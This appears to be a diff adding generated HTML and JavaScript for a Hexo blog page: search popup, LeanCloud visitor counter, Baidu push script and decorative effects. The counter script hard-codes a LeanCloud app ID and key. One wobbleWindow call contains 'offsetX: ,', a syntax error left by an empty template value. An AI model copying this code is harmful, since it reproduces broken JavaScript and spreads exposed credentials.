+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log('LeanCloud Counter Error: ' + responseJSON.code + ' ' + responseJSON.error);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'WtWopjB21xY5x2nLDalLtCkR-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'WtWopjB21xY5x2nLDalLtCkR-gzGzoHsz',
+                'X-LC-Key': 'IAjulOwXptsNYDpFKJrSDdq6',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+          $('#header').wobbleWindow({
+            radius: 50,
+            movementTop: false,
+            movementLeft: false,
+            movementRight: false,
+            debug: false,
+          });
+        
+
+        
+          $('#sidebar').wobbleWindow({
+            radius: 50,
+            movementLeft: false,
+            movementTop: false,
+            movementBottom: false,
+            position: 'fixed',
+            debug: false,
+          });
+        
+
+        
+          $('#footer').wobbleWindow({
+            radius: 50,
+            movementBottom: false,
+            movementLeft: false,
+            movementRight: false,
+            offsetX: ,
+            position: 'absolute',
+            debug: false,
+          });
+        
+      });
+    }
+  </script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script type="text/javascript" src="/js/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+</html>
